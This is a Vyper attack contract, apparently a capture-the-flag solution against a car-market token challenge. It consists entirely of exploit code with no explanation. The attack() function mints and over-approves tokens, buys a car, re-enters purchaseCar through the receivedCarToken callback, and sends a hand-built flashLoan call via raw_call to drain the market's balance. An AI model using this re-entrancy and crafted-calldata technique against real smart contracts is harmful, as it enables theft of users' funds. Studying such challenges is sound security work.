# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IToken:
    def mint(): nonpayable

interface IMarket:
    def purchaseCar(
        _color: String[32],
        _model: String[32],
        _plateNumber: String[32],
    ): nonpayable

interface IFactory:
    def flashLoan(
        _amount: uint256,
        _customer: address,
    ): nonpayable

owner: immutable(address)

token: address
market: address
factory: address

@external
@payable
def __init__(_token: address, _market: address, _factory: address):
    owner = msg.sender
    self.token = _token
    self.market = _market
    self.factory = _factory

@external
def attack():
    assert msg.sender == owner, "!owner"
    IToken(self.token).mint()
    IERC20(self.token).approve(
        self.market,
        IERC20(self.token).balanceOf(self) * 2,
    )
    IMarket(self.market).purchaseCar(
        "red",
        "Honda Civic",
        "JCN",
    )
    calldata: Bytes[36] = _abi_encode(
        IERC20(self.token).balanceOf(self.market),
        method_id=method_id("flashLoan(uint256)")
    )
    raw_call(self.market, calldata)

@external
def receivedCarToken(sender: address):
    assert sender == self.market, "!market"
    IMarket(sender).purchaseCar(
        "purple",
        "Jeep Wrangler",
        "JCN",
    )
